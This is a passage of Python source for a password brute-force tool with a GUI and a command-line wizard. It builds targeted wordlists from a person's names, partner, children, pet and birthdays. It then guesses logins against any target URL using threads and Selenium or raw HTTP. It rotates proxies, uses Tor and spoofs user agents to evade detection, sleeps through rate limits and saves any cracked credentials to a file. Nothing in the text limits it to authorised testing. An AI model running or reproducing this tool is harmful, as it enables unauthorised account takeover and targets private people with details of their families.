            self.cupp_name = QLineEdit(); self.cupp_name.setPlaceholderText("Required")
            self.cupp_surname = QLineEdit()
            self.cupp_nick = QLineEdit()
            self.cupp_bday = QLineEdit(); self.cupp_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_partner = QLineEdit()
            self.cupp_partner_nick = QLineEdit()
            self.cupp_partner_bday = QLineEdit(); self.cupp_partner_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_child = QLineEdit()
            self.cupp_child_nick = QLineEdit()
            self.cupp_child_bday = QLineEdit(); self.cupp_child_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_pet = QLineEdit()
            self.cupp_company = QLineEdit()
            self.cupp_keywords = QLineEdit(); self.cupp_keywords.setPlaceholderText("hacker,juice,black")
            self.cupp_specchars = QCheckBox("Add special chars")
            self.cupp_randnum = QCheckBox("Add random numbers")
            self.cupp_leet = QCheckBox("1337 mode")

            cupp_f.addRow("First Name *:", self.cupp_name)
            cupp_f.addRow("Surname:", self.cupp_surname)
            cupp_f.addRow("Nickname:", self.cupp_nick)
            cupp_f.addRow("Birthdate:", self.cupp_bday)
            cupp_f.addRow("Partner Name:", self.cupp_partner)
            cupp_f.addRow("Partner Nick:", self.cupp_partner_nick)
            cupp_f.addRow("Partner Bday:", self.cupp_partner_bday)
            cupp_f.addRow("Child Name:", self.cupp_child)
            cupp_f.addRow("Child Nick:", self.cupp_child_nick)
            cupp_f.addRow("Child Bday:", self.cupp_child_bday)
            cupp_f.addRow("Pet Name:", self.cupp_pet)
            cupp_f.addRow("Company:", self.cupp_company)
            cupp_f.addRow("Keywords:", self.cupp_keywords)
            cupp_f.addRow("", self.cupp_specchars)
            cupp_f.addRow("", self.cupp_randnum)
            cupp_f.addRow("", self.cupp_leet)
            cupp_l.addWidget(cupp_grp)

            # Number Sequence generator
            seq_grp = QGroupBox("  Number Sequence Generator (e.g. 2015001 to 2015002)")
            seq_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
            seq_f = QFormLayout(seq_grp)
            seq_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            seq_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            seq_f.setHorizontalSpacing(12)
            seq_f.setVerticalSpacing(8)
            
            self.seq_prefix = QLineEdit(); self.seq_prefix.setPlaceholderText("Prefix (optional)")
            self.seq_start = QSpinBox(); self.seq_start.setRange(0, 999999999); self.seq_start.setValue(2015000)
            self.seq_end = QSpinBox(); self.seq_end.setRange(0, 999999999); self.seq_end.setValue(2015100)
            self.seq_pad = QSpinBox(); self.seq_pad.setRange(0, 20); self.seq_pad.setToolTip("Pad with leading zeros")
            self.seq_suffix = QLineEdit(); self.seq_suffix.setPlaceholderText("Suffix (optional)")
            
            seq_f.addRow("Prefix:", self.seq_prefix)
            seq_f.addRow("Start Number:", self.seq_start)
            seq_f.addRow("End Number:", self.seq_end)
            seq_f.addRow("Zero Padding:", self.seq_pad)
            seq_f.addRow("Suffix:", self.seq_suffix)
            cupp_l.addWidget(seq_grp)

            cupp_btns = QHBoxLayout()
            self.cupp_gen_btn = QPushButton("🧠  Generate CUPP Profile")
            self.cupp_gen_btn.clicked.connect(self._run_cupp)
            
            self.seq_gen_btn = QPushButton("🔢  Generate Sequence")
            self.seq_gen_btn.clicked.connect(self._run_sequence)

            self.cupp_use_btn = QPushButton("📋  Use as Password List")
            self.cupp_use_btn.setEnabled(False)
            self.cupp_use_btn.clicked.connect(self._use_cupp_result)
            
            cupp_btns.addWidget(self.cupp_gen_btn)
            cupp_btns.addWidget(self.seq_gen_btn)
            cupp_btns.addWidget(self.cupp_use_btn)
            cupp_l.addLayout(cupp_btns)
            cupp_l.addStretch()
            self._cupp_result_path = ""
            cupp_scroll.setWidget(cupp_w)

            self.tabs.addTab(cupp_scroll, "🧠  CUPP")

            # ═══ Bottom: Controls + Log ═══
            ctrl_row = QHBoxLayout()
            self.start_btn = QPushButton("🚀 START ATTACK")
            self.start_btn.setStyleSheet("""
                QPushButton {
                    background-color: #059669;
                    border: 1px solid #10B981;
                    border-radius: 4px; padding: 12px 24px;
                    font-size: 13px; font-weight: 600; color: white;
                }
                QPushButton:hover { background-color: #10B981; }
                QPushButton:pressed { background-color: #047857; }
                QPushButton:disabled { background-color: #1F2937; border-color: #374151; color: #9CA3AF; }
            """)
            self.start_btn.clicked.connect(self._start_attack)
            
            self.stop_btn = QPushButton("⛔ STOP")
            self.stop_btn.setStyleSheet("""
                QPushButton {
                    background-color: #DC2626;
                    border: 1px solid #EF4444;
                    border-radius: 4px; padding: 12px 24px;
                    font-size: 13px; font-weight: 600; color: white;
                }
                QPushButton:hover { background-color: #EF4444; }
                QPushButton:pressed { background-color: #B91C1C; }
                QPushButton:disabled { background-color: #1F2937; border-color: #374151; color: #9CA3AF; }
            """)
            self.stop_btn.setEnabled(False)
            self.stop_btn.clicked.connect(self._stop_attack)
            
            self.clear_btn = QPushButton("🗑  WIPE LOGS")
            self.clear_btn.clicked.connect(lambda: self.log_txt.clear())
            
            ctrl_row.addWidget(self.start_btn)
            ctrl_row.addWidget(self.stop_btn)
            ctrl_row.addStretch()
            ctrl_row.addWidget(self.clear_btn)
            root.addLayout(ctrl_row)

            self.progress = QProgressBar()
            self.progress.setValue(0)
            root.addWidget(self.progress)

            self.log_txt = QTextEdit()
            self.log_txt.setReadOnly(True)
            self.log_txt.document().setMaximumBlockCount(200) # 🚀 Low-End PC speedup: prevents lag when dumping 10k logs
            self.log_txt.setMinimumHeight(100)
            self.log_txt.setMaximumHeight(200) # Limits max height to avoid eating the whole window and forces it to be a small scrollable box
            root.addWidget(self.log_txt)

            # ── Status bar line ──
            self.status_lbl = QLabel("Awaiting deployment...")
            self.status_lbl.setStyleSheet("color: #64748b; font-size: 12px; padding: 4px; font-weight: bold;")
            root.addWidget(self.status_lbl)

            # ── Keyboard shortcuts: Ctrl+X / Ctrl+C to stop ──
            QShortcut(QKeySequence("Ctrl+X"), self, activated=self._stop_attack)
            # Ctrl+C is captured by signal handler already

        # ── helpers ──
        def _pick_file(self, target):
            f, _ = QFileDialog.getOpenFileName(self, 'Open File', '', 'Text Files (*.txt);;All Files (*)')
            if f: target.setText(f)

        def _log(self, msg):
            self.log_txt.append(msg)

        # ── CUPP ──
        def _run_cupp(self):
            name = self.cupp_name.text().strip()
            if not name:
                QMessageBox.warning(self, "CUPP", "First Name is required."); return
            profile = {
                'name': name.lower(),
                'surname': self.cupp_surname.text().strip().lower(),
                'nick': self.cupp_nick.text().strip().lower(),
                'birthdate': self.cupp_bday.text().strip(),
                'wife': self.cupp_partner.text().strip().lower(),
                'wifen': self.cupp_partner_nick.text().strip().lower(),
                'wifeb': self.cupp_partner_bday.text().strip(),
                'kid': self.cupp_child.text().strip().lower(),
                'kidn': self.cupp_child_nick.text().strip().lower(),
                'kidb': self.cupp_child_bday.text().strip(),
                'pet': self.cupp_pet.text().strip().lower(),
                'company': self.cupp_company.text().strip().lower(),
                'words': [w.strip() for w in self.cupp_keywords.text().split(',') if w.strip()] or [''],
                'spechars1': 'y' if self.cupp_specchars.isChecked() else 'n',
                'randnum': 'y' if self.cupp_randnum.isChecked() else 'n',
                'leetmode': 'y' if self.cupp_leet.isChecked() else 'n',
            }
            self.cupp_gen_btn.setEnabled(False)
            self.cupp_gen_btn.setText("⏳ Generating...")
            self._cupp_thread = CuppWorkerThread(profile)
            self._cupp_thread.log_signal.connect(self._log)
            self._cupp_thread.finished_signal.connect(self._cupp_done)
            self._cupp_thread.start()

        def _cupp_done(self, path):
            self.cupp_gen_btn.setEnabled(True)
            self.cupp_gen_btn.setText("🧠  Generate CUPP Profile")
            self._cupp_result_path = path
            if path:
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"CUPP wordlist: {path}")

        def _run_sequence(self):
            prefix = self.seq_prefix.text()
            suffix = self.seq_suffix.text()
            start = self.seq_start.value()
            end = self.seq_end.value()
            pad = self.seq_pad.value()

            if start > end:
                QMessageBox.warning(self, "Error", "Start Number must be less than or equal to End Number.")
                return

            self.seq_gen_btn.setEnabled(False)
            self.seq_gen_btn.setText("⏳ Generating...")
            
            try:
                out_path = os.path.abspath("sequence_wordlist.txt")
                with open(out_path, 'w', encoding='utf-8') as f:
                    for i in range(start, end + 1):
                        num_str = str(i).zfill(pad)
                        f.write(f"{prefix}{num_str}{suffix}\n")
                
                self._log(f"[+] Sequence wordlist generated! ({end - start + 1} passwords) → {out_path}")
                self._cupp_result_path = out_path
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"Sequence wordlist: {out_path}")
            except Exception as e:
                self._log(f"[-] Sequence generation error: {e}")
            finally:
                self.seq_gen_btn.setEnabled(True)
                self.seq_gen_btn.setText("🔢  Generate Sequence")

        def _use_cupp_result(self):
            if self._cupp_result_path:
                self.pass_in.setText(self._cupp_result_path)
                self.tabs.setCurrentIndex(0)
                self._log(f"[+] Password list set to: {self._cupp_result_path}")

        # ── Attack ──
        def _start_attack(self):
            url = self.url_in.text().strip()
            if not url:
                QMessageBox.critical(self, "Error", "Enter a Target URL."); return
            if not url.startswith('http'): url = 'http://' + url

            up = self.user_in.text().strip()
            users = []
            if os.path.isfile(up):
                with open(up, encoding='utf-8', errors='ignore') as f:
                    users = [x.strip() for x in f if x.strip()]
            elif up:
                users = [up]

            pp = self.pass_in.text().strip()
            passwords = []
            if os.path.isfile(pp):
                with open(pp, encoding='utf-8', errors='ignore') as f:
                    passwords = [x.strip() for x in f if x.strip()]
            elif pp:
                passwords = [pp]

            if not users or not passwords:
                QMessageBox.critical(self, "Error", "Provide valid user and password input."); return

            proxies_list = []
            px = self.proxy_in.text().strip()
            if os.path.isfile(px):
                with open(px, encoding='utf-8', errors='ignore') as f:
                    proxies_list = [x.strip() for x in f if x.strip()]
            elif px:
                proxies_list = [px]

            ctx = {
                'target_url': url,
                'users': users,
                'passwords': passwords,
                'threads': self.threads_in.value(),
                'delay': self.delay_in.value(),
                'jitter': self.jitter_in.value(),
                'error_msg': self.err_in.text().strip().lower(),
                'success_msg': self.success_in.text().strip().lower(),
                'limit_text': self.limit_in.text().strip().lower(),
                'cooldown': self.cooldown_in.value(),
                'headless': self.headless_cb.isChecked(),
                'proxies': proxies_list,
                'use_tor': self.tor_cb.isChecked(),
                'tor_port': self.tor_port_in.value(),
                'tor_shift_every': self.tor_every_in.value(),
                
                'raw_mode': self.raw_cb.isChecked(),
                'raw_method': self.raw_method_cb.currentText(),
                'raw_data': self.raw_data_in.text(),
                'raw_headers': self.raw_headers_in.text(),
                'raw_timeout': self.raw_timeout_in.value(),
            }

            total = len(users) * len(passwords)
            self.progress.setMaximum(total)
            self.progress.setValue(0)
            self.log_txt.clear()
            self._log(f"[*] Target: {url}")
            self._log(f"[*] {len(users)} user(s)  ×  {len(passwords)} password(s)  =  {total} combos")
            self._log(f"[*] Threads: {ctx['threads']}   Tor: {'ON' if ctx['use_tor'] else 'OFF'}")
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.status_lbl.setText("Running...")

            self.worker_thread = GuiWorkerThread(ctx)
            self.worker_thread.log_signal.connect(self._log)
            self.worker_thread.progress_signal.connect(self._on_progress)
            self.worker_thread.finished_signal.connect(self._on_finished)
            self.worker_thread.start()

        def _stop_attack(self):
            if self.worker_thread and self.worker_thread.isRunning():
                self._log("[!] Stop requested — finishing current attempts...")
                self.worker_thread.request_stop()
                self.status_lbl.setText("Stopping...")

        def _on_progress(self, cur, total):
            self.progress.setValue(cur)
            self.status_lbl.setText(f"Progress: {cur}/{total}")

        def _on_finished(self, found, msg):
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.status_lbl.setText(msg)
            if found:
                self.progress.setStyleSheet("QProgressBar::chunk{background-color: #10B981; border-radius: 3px;}")
                QMessageBox.information(self, "Success", msg)
            else:
                self.progress.setStyleSheet("QProgressBar::chunk{background-color: #EF4444; border-radius: 3px;}")
                QMessageBox.warning(self, "Finished", msg)

    # ── Launch the GUI ──
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    app.setStyleSheet(DARK_STYLE)
    win = BlueCrackGUI()
    win.show()
    sys.exit(app.exec())
    # GUI mode exits here — CLI code below never runs
# ═══════════════════════════════════════════════════════════════════

# INTERACTIVE MODE
if args.interactive:
    print("\n\033[36m--- WIZARD MODE ---\033[0m")
    
    # CUPP Integration
    run_cupp = input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ").strip().lower() == 'y'
    if run_cupp:
        print("\n\033[33m--- LAUNCHING CUPP (Common User Passwords Profiler) ---\033[0m")
        if os.path.exists("cupp.py"):
            os.system(f"{sys.executable} cupp.py -i")
            print("\n\033[32m[+] CUPP completed! Make sure to remember the saved filename.\033[0m\n")
        else:
            print("\n❌ cupp.py not found in the directory. Skipping...\n")
            
    args.url = input("\nEnter Target URL: ").strip()
    args.username = input("Enter single username to test (leave blank to skip): ").strip() or None
    if not args.username:
        args.userfile = input("Enter path to usernames list file: ").strip() or None
    
    # Get password approach correctly in wizard
    single_pass = input("Enter single password to test (leave blank to skip): ").strip()
    if single_pass:
        args.password = single_pass
        args.passfile = None
    else:
        args.password = None
        args.passfile = input("Enter path to passwords list file: ").strip() or None
    
    threads_in = input("Enter number of threads [default: 1]: ").strip()
    args.threads = int(threads_in) if threads_in.isdigit() else 1
    
    err_in = input("Enter error string to check (default: 'incorrect'): ").strip()
    if err_in:
        args.error = err_in
        
    delay_in = input("Enter general delay between attempts in seconds [default: 0]: ").strip()
    args.delay = float(delay_in) if delay_in.replace('.', '', 1).isdigit() else 0.0
    
    jitter_in = input("Enter jitter/randomizer up to X seconds [default: 0.0]: ").strip()
    args.jitter = float(jitter_in) if jitter_in.replace('.', '', 1).isdigit() else 0.0
    
    use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == 'y'
    if use_proxy:
        p_file = input("Enter path to proxy list file (or hit enter to use single proxy): ").strip()
        if p_file:
            args.proxyfile = p_file
        else:
            args.proxy = input("Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): ").strip()
    
    rl_bypass = input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ").strip().lower() != 'n'
    args.cooldown = 12 if rl_bypass else 0
    if rl_bypass:
        rl_text = input("Enter Rate Limit text to detect [default: 'too many requests']: ").strip()
        if rl_text:
            args.limit_text = rl_text
        
    auto_detect = input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ").strip().lower() != 'n'
else:
    auto_detect = False
    if not args.url:
        raise SystemExit("❌ Provide --url or use -i wizard")

if not args.username and not args.userfile:
    raise SystemExit("❌ Provide -u USER or -U USERFILE")

if not args.password and not args.passfile:
    raise SystemExit("❌ Provide -p PASS or -P PASSLIST")
    
# LOAD USERNAMES
users = []

if args.username:
    users.append(args.username)

if args.userfile:
    with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            users.append(line.strip())
# LOAD PASSWORDS
passwords = []

if args.password:
    passwords.append(args.password)

if args.passfile:
    with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            px = line.strip()
            if px:  # Avoid empty strings creating false-positive vulnerabilities
                passwords.append(px)

# LOAD PROXIES
proxies = []
if args.proxy:
    proxies.append(args.proxy)
if args.proxyfile:
    with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if line.strip():
                proxies.append(line.strip())

USERNAME_FIXED = users[0] if len(users) == 1 else None
USERLIST = users if len(users) > 1 else None

PASSWORD_FIXED = passwords[0] if len(passwords) == 1 else None
PASSLIST = passwords if len(passwords) > 1 else None
WORDLIST = f"{len(passwords)} passwords loaded for {len(users)} users"
PROXY_INFO = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

THREADS = args.threads
TARGET_URL = args.url
if TARGET_URL and not TARGET_URL.startswith("http://") and not TARGET_URL.startswith("https://"):
    TARGET_URL = "http://" + TARGET_URL
ERROR_MSG = args.error.lower()
LIMIT_TEXT = args.limit_text.lower() if args.limit_text else None
COOLDOWN = args.cooldown
DELAY = args.delay
JITTER = args.jitter
RUN_HEADLESS = args.headless

# RAW MODE SETTINGS
IS_RAW_MODE = args.raw
RAW_METHOD = args.method.upper()
RAW_DATA = args.data
RAW_TIMEOUT = args.timeout
RAW_HEADERS = {}
if args.headers:
    try:
        for pair in args.headers.split('|'):
            k, v = pair.split(':', 1)
            RAW_HEADERS[k.strip()] = v.strip()
    except Exception as e:
        print(f"[-] Failed to parse headers: {e}")

SUCCESS_MSG = args.success.lower() if args.success else None

username_selector = None
password_selector = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Mode: {'RAW HTTP' if IS_RAW_MODE else 'SELENIUM BROWSER'}")
print(f"Proxies: {PROXY_INFO}")
print(f"Threads: {THREADS}")
print(f"Delay/Jitter: {DELAY}s / {JITTER}s")

if not IS_RAW_MODE:
    # LAUNCH SELENIUM FOR SETUP
    driver = webdriver.Chrome()
    driver.get(TARGET_URL)

    # Inject JS to track last clicked element
    driver.execute_script("""
    document.addEventListener('click', function(e) {
        window._lastClicked = e.target;
    });
    """)

    # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
    def get_css_selector():
        elem = driver.execute_script("return window._lastClicked")
        if elem is None:
            return None
        return driver.execute_script("""
        function cssPath(el){
            if (!el) return null;
            var path = [];
            while (el.nodeType === Node.ELEMENT_NODE){
                var selector = el.nodeName.toLowerCase();
                if (el.id){
                    selector += "#" + el.id;
                    path.unshift(selector);
                    break;
                } else {
                    var sib = el, nth = 1;
                    while(sib = sib.previousElementSibling){
                        if (sib.nodeName.toLowerCase() == selector)
                            nth++;
                    }
                    if (nth != 1)
                        selector += ":nth-of-type("+nth+")";
                }
                path.unshift(selector);
                el = el.parentNode;
            }
            return path.join(" > ");
        }
        return cssPath(arguments[0]);
        """, elem)

    if auto_detect:
        print("\n🔍 Auto-detecting login form fields...")
        time.sleep(2)  # Let page load completely
        try:
            # Passwords usually have type "password"
            # Usernames are usually the element right before the password or type="text"/"email"
            driver.execute_script("""
                window._autoFindFields = function() {
                    let passwordField = document.querySelector('input[type="password"]');
                    let userField = null;
                    
                    if (passwordField) {
                        // Look for preceding text/email inputs in the same form
                        let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
                        for (let el of inputs) {
                            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                                userField = el;
                                break;
                            }
                        }
                    }
                    
                    // Fallback basic CSS
                    let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
                    let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
                    
                    return [ucss, pcss];
                };
            """)
            
            detected_selectors = driver.execute_script("return window._autoFindFields();")
            if detected_selectors and detected_selectors[0] and detected_selectors[1]:
                username_selector, password_selector = detected_selectors
                print(f"✅ AUTO-DETECTED Username: {username_selector}")
                print(f"✅ AUTO-DETECTED Password: {password_selector}")
            else:
                print("❌ Courier auto-detect failed. Please lock manually.")
                auto_detect = False
        except Exception as e:
            print(f"❌ Auto-detect script failed: {e}. Switching to manual mode.")
            auto_detect = False

    # WAIT FOR USER TO LOCK FIELDS
    if not auto_detect:
        print("\n👉 CLICK username field → press S")
        print("👉 CLICK password field → press T")
        print("👉 Press ENTER to start brute\n")

    while username_selector is None or password_selector is None:
        if keyboard.is_pressed("s"):
            css = get_css_selector()
            if css:
                username_selector = css
                print(f"🔵 Username selector LOCKED: {css}")
            time.sleep(0.3)
        if keyboard.is_pressed("t"):
            css = get_css_selector()
            if css:
                password_selector = css
                print(f"🟣 Password selector LOCKED: {css}")
            time.sleep(0.3)

    print("\nSelectors locked! Press ENTER to launch brute...")

    # TEST THE SELECTORS IMMEDIATELY (fix)
    driver.find_element(By.CSS_SELECTOR, username_selector)
    driver.find_element(By.CSS_SELECTOR, password_selector)

    keyboard.wait("enter")

# LOAD WORDLIST
q = Queue()
for user in users:
    for pwd in passwords:
        q.put((user, pwd))

found = False

# WORKER FUNCTION
def worker():
    global found
    
    thread_driver = None
    if not IS_RAW_MODE:
        # Initialize a new webdriver for each thread
        options = get_optimized_chrome_options()
        
        USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
        
        # Optional Proxy Rotation
        if proxies:
            proxy = random.choice(proxies)
            options.add_argument(f"--proxy-server={proxy}")

        if RUN_HEADLESS:
            options.add_argument("--headless=new")
            
        thread_driver = webdriver.Chrome(options=options)
    
    # Raw mode session
    session = None
    if IS_RAW_MODE:
        session = requests.Session()
        if proxies:
            proxy = random.choice(proxies)
            session.proxies = {"http": proxy, "https": proxy}
        session.headers.update(RAW_HEADERS)
    
    try:
        while not q.empty() and not found and not _GLOBAL_STOP.is_set():
            user, pwd = q.get()
            
            # Skip empty passwords
            if not pwd or str(pwd).strip() == "":
                q.task_done()
                continue
                
            try:
                if found or _GLOBAL_STOP.is_set(): break
                
                # Add delay
                actual_delay = DELAY
                if JITTER > 0.0: actual_delay += random.uniform(0, JITTER)
                if actual_delay > 0.0:
                    for _ in range(int(actual_delay * 10)):
                        if found: break
                        time.sleep(0.1)
                if found: break
                
                print(f"[*] Trying: {user} / {pwd}")
                
                if IS_RAW_MODE:
                    # RAW REQUESTS MODE (Blazing fast, no browser)
                    payload = RAW_DATA.replace("^USER^", user).replace("^PASS^", pwd)
                    try:
                        if RAW_METHOD == "POST":
                            if RAW_HEADERS.get("Content-Type") == "application/json":
                                resp = session.post(TARGET_URL, data=payload.encode('utf-8'), timeout=RAW_TIMEOUT)
                            else:
                                # Default to application/x-www-form-urlencoded
                                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                                headers.update(RAW_HEADERS)
                                resp = session.post(TARGET_URL, data=payload, headers=headers, timeout=RAW_TIMEOUT)
                        else:
                            resp = session.get(TARGET_URL + "?" + payload, timeout=RAW_TIMEOUT)
                            
                        page_source = resp.text.lower()
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Request error: {e}")
                        q.task_done()
                        continue
                else:
                    # SELENIUM MODE
                    thread_driver.get(TARGET_URL)
                    if found: break
                    
                    u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                    p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                    u.clear()
                    u.send_keys(user)
                    p.clear()
                    p.send_keys(pwd)
                    p.send_keys(Keys.ENTER)
                    
                    if found: break
                    
                    # Wait for login
                    for _ in range(20):
                        if found: break
                        time.sleep(0.1)
                    if found: break
                    
                    page_source = thread_driver.page_source.lower()
                
                # Check for rate limiting
                if LIMIT_TEXT and LIMIT_TEXT in page_source:
                    print(f"[\033[33m!\033[0m] Rate Limit detected ('{LIMIT_TEXT}')!")
                    if COOLDOWN > 0:
                        print(f"[\033[36m~\033[0m] Bypassing... Sleeping {COOLDOWN}s")
                        for _ in range(COOLDOWN * 10):
                            if found: break
                            time.sleep(0.1)
                        if not found:
                            q.put((user, pwd))
                    continue

                # Check Success/Failure
                is_valid = False
                if SUCCESS_MSG:
                    if SUCCESS_MSG in page_source:
                        is_valid = True
                else:
                    # Explicit error check (Fail mode)
                    if ERROR_MSG and ERROR_MSG not in page_source:
                        is_valid = True
                        
                if is_valid and not found:
                    print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
                    found = True
                    try:
                        with open("credentials.txt", "a", encoding="utf-8") as cf:
                            cf.write(f"{user}:{pwd}\\n")
                    except: pass
                    with q.mutex:
                        q.queue.clear()
                break

            except (NoSuchElementException, WebDriverException) as e:
                print(f"[-] Error during attempt with '{user} / {pwd}': element not found.")
            except Exception as e:
                print(f"[-] Navigation or unexpected error: {e}")
            finally:
                q.task_done()
    finally:
        if thread_driver:
            try:
                thread_driver.quit()
            except:
                pass

# Close the initial setup driver
if not IS_RAW_MODE:
    try:
        driver.quit()
    except:
        pass

# THREAD LAUNCHER
threads = []
print(f"\n[*] Starting {THREADS} threads...\n")
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for completion
    while not q.empty() and not found and not _GLOBAL_STOP.is_set():
        time.sleep(0.1)
        
    if not found:
        q.join()
        
    if not found:
        print("\n[-] Finished testing. No valid credentials found.")
    else:
        print("\n[+] Finished testing. Valid credentials found!")
except KeyboardInterrupt:
    print("\n[!] Interrupted by user (Ctrl+C). Exiting gracefully...")
    found = True
    _GLOBAL_STOP.set()
finally:
    if _GLOBAL_STOP.is_set() and not found:
        print("\n[!] Stopped by signal. Cleaning up...")
    pass
